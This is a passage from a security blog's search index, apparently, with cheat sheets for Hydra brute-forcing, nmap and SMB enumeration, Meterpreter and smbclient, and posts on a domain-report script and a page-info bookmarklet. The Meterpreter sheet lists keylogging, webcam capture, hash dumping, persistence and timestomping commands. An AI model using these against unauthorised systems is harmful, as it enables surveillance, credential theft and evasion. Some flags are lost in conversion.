\u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for usernames/logins.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-P \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for passwords.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target port.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-f\u003c/code\u003e\u003c/strong\u003e: Stop brute-forcing after finding valid credentials.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Restore a previous session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t \u0026lt;number\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Set the number of threads to use.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-V\u003c/code\u003e\u003c/strong\u003e: Enable verbose mode.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"supported-protocols\"\u003eSupported Protocols\u003c/h2\u003e\n\u003cp\u003eHydra supports numerous protocols, including:\u003c/p\u003e","title":"Hydra"},{"content":"Basic Syntax nmap \u0026lt;target IP\u0026gt; nmap -sT -sS -Pn -v 10.10.10.10 sudo nmap -A -sS -Pn 10.10.10.10 sudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10 Common Flags Scan Types -sT: Perform a TCP connect scan. -sU: Perform a UDP scan. -sS: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;). -Pn: Skip pinging the target. -sn: Host discovery without scanning ports. -A: Enable aggressive scan options. Advanced Features -p \u0026lt;PORT\u0026gt;: Scan specific ports. -p-: Scan all 65,535 ports. -sV: Detect services and versions running on the target. -O: Detect the operating system. -v****, -vv, ********-vvv: Set verbosity levels. --script vuln: Run vulnerability scripts. --script vulners: Use vulners scripts for CVE-based scanning. --script=http-enum: Act like Nikto to enumerate HTTP resources. Output Formats -oN: Normal text output, best for human-readable logs during manual reviews. -oX: XML output, ideal for automated tools or integrations that require structured data. ``: Greppable output, useful for scripting and quickly filtering resulst with tools like grep. -oA: Generate all three formats at once, providing maximum flexibility for further analysis or reporting. SMB Scripts Enumerate Security Mode nmap -p445 --script smb-security-mode 192.168.1.1 Enumerate Sessions nmap -p445 --script smb-enum-sessions 192.168.1.1 nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares nmap -p445 --script smb-enum-shares 192.168.1.1 nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares with Listing Listing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\nnmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Users nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Stats nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Domains nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Groups nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password 192.168.1.1 SSH Scripts Enumerate Algorithms nmap 192.168.1.1 -p 22 --script ssh2-enum-algos Enumerate Host Keys nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full Enumerate Authentication Methods nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=\u0026#34;ssh.user=admin\u0026#34; ","permalink":"http://localhost:1313/cheat-sheets/nmap/","summary":"\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap \u0026lt;target IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sT -sS -Pn -v 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -A -sS -Pn 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003ch3 id=\"scan-types\"\u003eScan Types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sT\u003c/code\u003e\u003c/strong\u003e: Perform a TCP connect scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sU\u003c/code\u003e\u003c/strong\u003e: Perform a UDP scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sS\u003c/code\u003e\u003c/strong\u003e: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-Pn\u003c/code\u003e\u003c/strong\u003e: Skip pinging the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sn\u003c/code\u003e\u003c/strong\u003e: Host discovery without scanning ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-A\u003c/code\u003e\u003c/strong\u003e: Enable aggressive scan options.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"advanced-features\"\u003eAdvanced Features\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Scan specific ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/strong\u003e: Scan all 65,535 ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/strong\u003e: Detect services and versions running on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-O\u003c/code\u003e\u003c/strong\u003e: Detect the operating system.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****, \u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003ccode\u003e-vv\u003c/code\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e, ****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003ccode\u003e-vvv\u003c/code\u003e\u003c/strong\u003e: Set verbosity levels.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vuln\u003c/code\u003e\u003c/strong\u003e: Run vulnerability scripts.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vulners\u003c/code\u003e\u003c/strong\u003e: Use vulners scripts for CVE-based scanning.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script=http-enum\u003c/code\u003e\u003c/strong\u003e: Act like Nikto to enumerate HTTP resources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oN\u003c/code\u003e\u003c/strong\u003e: Normal text output, best for human-readable logs during manual reviews.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oX\u003c/code\u003e\u003c/strong\u003e: XML output, ideal for automated tools or integrations that require structured data.\u003c/li\u003e\n\u003cli\u003e``: Greppable output, useful for scripting and quickly filtering resulst with tools like \u003ccode\u003egrep\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oA\u003c/code\u003e\u003c/strong\u003e: Generate all three formats at once, providing maximum flexibility for further analysis or reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"smb-scripts\"\u003eSMB Scripts\u003c/h2\u003e\n\u003ch3 id=\"enumerate-security-mode\"\u003eEnumerate Security Mode\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-security-mode 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-sessions\"\u003eEnumerate Sessions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares\"\u003eEnumerate Shares\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares-with-listing\"\u003eEnumerate Shares with Listing\u003c/h3\u003e\n\u003cp\u003eListing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\u003c/p\u003e","title":"nmap"},{"content":"Daily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where RedFlagger comes in. This lightweight Bash script automates the process of downloading and aggregating reports from Red Flag Domains. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\nThe Backstory This project started as a bit of a joke. My friend lil-doudou had written an excellent Python tool called NewRedflag to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\nWhat Does RedFlagger Do? RedFlagger streamlines the process of collecting domain reports. Instead of manually navigating the Red Flag Domains website and downloading reports one by one, you can use RedFlagger to:\nFetch the latest report. Download reports from a specific range of dates. Aggregate all available reports into one file for easier analysis. It’s a no-frills script that prioritizes functionality and flexibility.\nHow Does It Work? RedFlagger fetches reports directly from the Red Flag Domains website by parsing the daily directory. It uses simple Bash commands like curl to download files and aggregates them into a single output file for easy handling. If you’re running a quick analysis or building a dataset for long-term research, this script has you covered.\nKey Features: Custom Date Ranges: Specify a range of days to download only the reports you need. All-Inclusive Downloads: Grab every report available with a single command. Custom Output Files: Aggregate data into a file of your choice instead of dealing with multiple separate files. Why Use RedFlagger? RedFlagger is built for simplicity and speed. It doesn’t aim to replace more advanced tools but instead provides a lightweight option for users who need quick, automated access to domain reports. If you find yourself regularly pulling data from Red Flag Domains, RedFlagger can:\nSave time by automating the download process. Ensure reports are organized and aggregated for easier analysis. Provide flexible options for handling specific dates or all available data. Whether you’re an analyst tracking malicious domains or a researcher building a threat intelligence dataset, RedFlagger can fit seamlessly into your workflow.\nGetting Started Installation RedFlagger is a standalone Bash script, so there’s no complicated setup. Here’s how to get started:\nDownload the script:\ngit clone https://github.com/noobosaurus-r3x/redflagger cd redflagger chmod +x redflagger.sh Make sure curl is installed on your system:\nsudo apt install curl Usage The script provides several options to customize your downloads. Here’s the basic syntax:\n./redflagger.sh [--latest|--days num] [--all] [--output filename] Options --latest or -l: Downloads the report from 1 day ago. --days num or -d num: Downloads the report from num days ago. --all or -a: Downloads all available reports. --output filename or -o filename: Specifies the output file to store the downloaded reports. Defaults to output.txt if no filename is provided. Examples Here are a few practical ways to use RedFlagger:\nDownload the latest report:\n./redflagger.sh -l Download all reports available since 3 days ago:\n./redflagger.sh -d 3 -a -o my_file.txt Download a specific day’s report:\n./redflagger.sh -d 5 -o report_5days_ago.txt Download all reports into a custom file:\n./redflagger.sh -a -o all_reports.txt Limitations and Room for Improvement RedFlagger is intentionally simple, but it’s not without its limitations. Here are a few areas where it could be expanded or improved:\nError Handling: While the script includes basic error checks, it could provide more detailed feedback when something goes wrong (e.g., network issues or missing reports). Parallel Downloads: Adding support for downloading multiple reports simultaneously could speed up large fetches. Advanced Filtering: Options for filtering by domain type or metadata could make the tool even more powerful. If you’re interested in extending RedFlagger, feel free to fork it and make it your own.\nFinal Thoughts RedFlagger is a small, straightforward tool designed to make life easier for anyone working with Red Flag Domains. It doesn’t try to do everything but focuses on doing one thing well: fetching and aggregating domain reports quickly and efficiently.\nWhether you’re doing threat research, building datasets, or just exploring the domain data available, RedFlagger is a lightweight addition to your toolbox. And let’s not forget—it’s also a fun jab at my friend’s Python-first approach. If you’ve got ideas for improvements or run into any issues, don’t hesitate to reach out or fork the project. Happy aggregating!\n","permalink":"http://localhost:1313/tools/redflagger/","summary":"\u003cp\u003eDaily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where \u003cstrong\u003eRedFlagger\u003c/strong\u003e comes in. This lightweight Bash script automates the process of downloading and aggregating reports from \u003ca href=\"https://dl.red.flag.domains/daily/\"\u003eRed Flag Domains\u003c/a\u003e. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\u003c/p\u003e\n\u003ch2 id=\"the-backstory\"\u003eThe Backstory\u003c/h2\u003e\n\u003cp\u003eThis project started as a bit of a joke. My friend \u003cstrong\u003elil-doudou\u003c/strong\u003e had written an excellent Python tool called \u003ca href=\"https://github.com/lil-doudou/NewRedflag\"\u003eNewRedflag\u003c/a\u003e to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\u003c/p\u003e","title":"redflagger"},{"content":"When you need to quickly understand the structure of a webpage, a lightweight tool can save the day. Webpage Infos Extractor is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\nWhy Build This? Sometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\nWhat Does It Do? Once activated, the bookmarklet scans the current webpage and extracts:\nForms: Shows details like form actions, methods, and input elements.\nLinks: Lists all hyperlinks found on the page.\nImages: Displays all images in an easy-to-view layout.\nWord Count: Calculates the total number of words in the page’s text content.\nThe results are neatly presented in a new browser window with clean formatting, so you can analyze everything at a glance.\nInstallation Setting it up is simple. Here’s how:\nOpen your web browser and create a new bookmark.\nEdit the bookmark’s URL field and paste the following JavaScript code:\njavascript:(function(){var forms=document.getElementsByTagName(\u0026#39;form\u0026#39;);var links=document.getElementsByTagName(\u0026#39;a\u0026#39;);var images=document.getElementsByTagName(\u0026#39;img\u0026#39;);var bodyText=document.body.innerText;var wordCount=bodyText.split(/\\s+/).filter(function(word){return word.length\u0026gt;0;}).length;var newWindow=window.open(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;width=800,height=600\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Extracted Data\u0026lt;/title\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;style\u0026gt;body{font-family:Arial,sans-serif}table{width:100%;border-collapse:collapse;margin-bottom:20px}th,td{border:1px solid #ddd;padding:8px;text-align:left}th{background-color:#f2f2f2}tr:nth-child(even){background-color:#f9f9f9}h2{background-color:#4CAF50;color:white;padding:10px}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Forms:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;forms.length;i++){var form=forms[i];newWindow.document.write(\u0026#39;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th colspan=\u0026#34;3\u0026#34;\u0026gt;Form \u0026#39;+(i+1)+\u0026#39;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.action||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Method\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.method||\u0026#39;get\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Type\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Value\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var j=0;j\u0026lt;form.elements.length;j++){var element=form.elements[j];var value=element.value||\u0026#39;N/A\u0026#39;;if(element.type===\u0026#39;checkbox\u0026#39;||element.type===\u0026#39;radio\u0026#39;){value=element.checked?\u0026#39;on\u0026#39;:\u0026#39;off\u0026#39;}newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.name||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.type||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+value+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Links:\u0026lt;/h2\u0026gt;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Link\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;links.length;i++){newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;+links[i].href+\u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39;+links[i].href+\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Images:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;images.length;i++){newWindow.document.write(\u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;+images[i].src+\u0026#39;\u0026#34; style=\u0026#34;max-width:100%;display:block;margin-bottom:10px;\u0026#34;\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Word Count:\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;\u0026#39;+wordCount+\u0026#39; words\u0026lt;/p\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;);newWindow.document.close();})(); Save the bookmark.\nThat’s it! You now have a bookmarklet ready to extract webpage info.\nHow to Use Navigate to the webpage you want to analyze.\nClick on the saved bookmarklet.\nA new window will pop up with the following details:\nForms: Lists actions, methods, and input fields.\nLinks: Displays all hyperlinks found on the page.\nImages: Previews all images on the page.\nWord Count: Shows the total word count of the page’s text content.\nWhy Use It? This tool is perfect for:\nWeb Developers: Debugging forms, analyzing links, or reviewing images for optimization.\nContent Creators: Counting words or inspecting embedded media.\nResearchers: Extracting links or analyzing page structures quickly.\nIt’s not trying to replace full-fledged tools like browser dev tools, but it’s great for quick insights without digging into a complex interface.\nLimitations This bookmarklet is lightweight and portable, but it’s not flawless. Here are a few things to keep in mind:\nBrowser Compatibility: It works on most modern browsers but may struggle with certain page structures or dynamic content.\nStatic Analysis: It doesn’t execute JavaScript-heavy elements, so it’s best suited for simpler pages.\nBasic Formatting: The output is clean but not customizable.\nFinal Thoughts The Webpage Infos Extractor isn’t revolutionary, but it’s incredibly handy. Whether you’re troubleshooting a webpage or casually analyzing content, this bookmarklet gives you the essentials at a click. Simple, portable, and effective (sometimes), that’s all you need. If you think of ways to enhance it, feel free to tweak the code and make it your own!\n","permalink":"http://localhost:1313/tools/webpage_infos_extractor/","summary":"\u003cp\u003eWhen you need to quickly understand the structure of a webpage, a lightweight tool can save the day. \u003cstrong\u003eWebpage Infos Extractor\u003c/strong\u003e is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\u003c/p\u003e\n\u003ch2 id=\"why-build-this\"\u003eWhy Build This?\u003c/h2\u003e\n\u003cp\u003eSometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\u003c/p\u003e","title":"Webpage Infos Extractor"},{"content":"Basic Commands Start with the essentials to get a lay of the land:\nhelp: Display a list of available commands (your lifeline when you\u0026rsquo;re lost). sysinfo: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;). ps: List running processes. kill \u0026lt;PID\u0026gt;: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;). migrate \u0026lt;PID\u0026gt;: Move Meterpreter to a different process to stay under the radar. rev2self: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird). File System Commands For poking around the file system:\nls: List files in the current directory. cd \u0026lt;path\u0026gt;: Change to a new directory. pwd: Print the current working directory. cat \u0026lt;filename\u0026gt;: Display the contents of a file. download \u0026lt;filename\u0026gt;: Pull a file from the target to your local machine. upload \u0026lt;filename\u0026gt;: Push a file to the target system. Network Commands To scope out the network situation:\nipconfig: Display network configuration (IP addresses, gateways, etc.). route: Show the routing table. netstat: View active network connections. portfwd [add/remove]: Set up port forwarding (e.g., local port -\u0026gt; remote service). getsockname: Identify the socket name for a connection. User Management Commands Understand who you are and who else is around:\ngetuid: Display the current user ID. ps: See running processes and their owners. getprivs: List the privileges available to the current user. getsystem: Attempt to escalate privileges to SYSTEM (good luck!). Persistence Commands Stick around longer than you’re welcome:\npersistence: Enable Meterpreter persistence on the target (requires autorun setup). run \u0026lt;script\u0026gt;: Execute scripts or commands at startup. Shell Commands Take a deeper dive with shell access:\nshell: Open a command prompt on the target (sometimes, old-school is best). execute -f \u0026lt;command\u0026gt;: Run a command on the target. background: Push your current session into the background to multitask. Ctrl+Z: Suspend the current session (don’t forget to resume it later). Other Commands For the extra \u0026ldquo;James Bond\u0026rdquo; touch:\nuse \u0026lt;extension\u0026gt;: Load a Meterpreter extension (e.g., incognito, sniffer). keyscan_start: Begin logging keystrokes (capture your target’s every typo). keyscan_dump: Dump the logged keystrokes. screenshot: Capture a screenshot of the target’s desktop. webcam_list: See available webcams on the target. webcam_snap: Take a snapshot from a webcam. hashdump: Dump password hashes (everyone’s favorite). timestomp \u0026lt;file\u0026gt;: Modify the timestamps of a file (because subtlety matters). Tips and Tricks Migrate Smartly: When migrating, pick a process that’s stable (e.g., explorer.exe) and won’t raise suspicions. Background Often: Always background your session before launching new exploits—multitasking is key. Scripting is King: Use Meterpreter scripts (run \u0026lt;script\u0026gt;) to automate repetitive tasks. ","permalink":"http://localhost:1313/cheat-sheets/meterpreter/","summary":"\u003ch2 id=\"basic-commands\"\u003eBasic Commands\u003c/h2\u003e\n\u003cp\u003eStart with the essentials to get a lay of the land:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehelp\u003c/code\u003e\u003c/strong\u003e: Display a list of available commands (your lifeline when you\u0026rsquo;re lost).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esysinfo\u003c/code\u003e\u003c/strong\u003e: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eps\u003c/code\u003e\u003c/strong\u003e: List running processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ekill \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003emigrate \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Move Meterpreter to a different process to stay under the radar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003erev2self\u003c/code\u003e\u003c/strong\u003e: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"file-system-commands\"\u003eFile System Commands\u003c/h2\u003e\n\u003cp\u003eFor poking around the file system:\u003c/p\u003e","title":"Meterpreter"},{"content":"smbclient is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\nBasic Usage To connect to an SMB file share, use the following syntax:\nsmbclient //server/share [options] Replace server with the hostname or IP address of the server hosting the file share. Replace share with the name of the file share. Once connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\nCommon Options -U \u0026lt;username\u0026gt;: Specify the username to use for authentication. -W \u0026lt;workgroup\u0026gt;: Specify the domain or workgroup. -I \u0026lt;IP address\u0026gt;: Directly specify the server\u0026rsquo;s IP address. -p \u0026lt;port\u0026gt;: Specify the port (default is 445). -d \u0026lt;debug level\u0026gt;: Set the debug level for verbose output. -N: Suppress the password prompt (useful for guest accounts). Available Commands Once connected, the following commands allow you to interact with the file share:\nls: List files and directories in the current directory. cd \u0026lt;directory\u0026gt;: Change to a different directory. pwd: Print the current working directory. put \u0026lt;file\u0026gt;: Upload a file to the share. get \u0026lt;file\u0026gt;: Download a file from the share. mput \u0026lt;files\u0026gt;: Upload multiple files. mget 